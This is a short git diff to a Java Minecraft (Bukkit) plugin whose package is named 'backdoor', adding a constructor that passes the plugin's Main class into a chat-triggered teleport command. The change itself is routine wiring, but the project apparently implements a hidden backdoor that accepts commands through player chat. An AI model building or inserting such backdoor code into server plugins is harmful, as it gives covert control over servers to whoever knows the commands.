@@ -2,6 +2,7 @@ package me.tsb.backdoor.commands;
 
 import me.tsb.backdoor.Command;
 import me.tsb.backdoor.RegisterCommand;
+import me.tsb.plugin.Main;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.World;
@@ -13,6 +14,12 @@ import java.util.Objects;
 
 @RegisterCommand(displayName = "teleport", aliases = {"tp", "tele", "teleport"})
 public class TpCommand extends Command {
+
+    private final Main main;
+
+    public TpCommand (Main main) {
+        this.main = main;
+    }
 
     @Override
     public void onExec(PlayerChatEvent event, ArrayList<String> args) {
